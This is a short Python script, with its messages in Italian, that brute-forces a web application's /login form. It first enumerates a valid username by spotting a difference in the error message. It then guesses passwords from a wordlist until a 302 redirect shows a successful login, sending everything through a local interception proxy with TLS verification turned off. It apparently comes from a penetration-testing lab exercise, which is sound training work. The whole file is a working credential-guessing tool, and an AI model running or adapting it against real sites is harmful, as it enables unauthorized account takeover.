import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

username_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\usernames.txt"
password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"

def perform_request(url,username,password):
    uri = "/login"
    cookies = {'session' : 'MkcFuUb7j43iRA5MqRwHjs4kKx4Z1oeu'}
    data = {'username' : username , 'password' : password}
    r = requests.post(url + uri, data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    return r
    

def username_enumerator(url,username_list):
    with open(username_list) as u:
        for x in u:
            username = x.split("\n")[0]
            sys.stdout.write("[+] Sto testando il nome utente %s\r" % username)
            sys.stdout.flush()
            response = perform_request(url,username,"blank")
            if "Invalid username or password." not in response.text:
                print("\n[+] Nome utente trovato! ==> " + username)
                u.close()
                return username
            sys.stdout.write("\033[K")
        u.close()

def password_enumerator(url,username,password_list):
    with open(password_list) as p:
        for x in p:
            password = x.split("\n")[0]
            sys.stdout.write("[+] Sto testando la password %s\r" % password)
            sys.stdout.flush()
            response = perform_request(url,username,password)
            if response.status_code == 302:
                print("\n[+] Password trovata! ==> " + password)
                p.close()
                return
            sys.stdout.write("\033[K")
        p.close()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    username = username_enumerator(url,username_list)
    password_enumerator(url,username,password_list)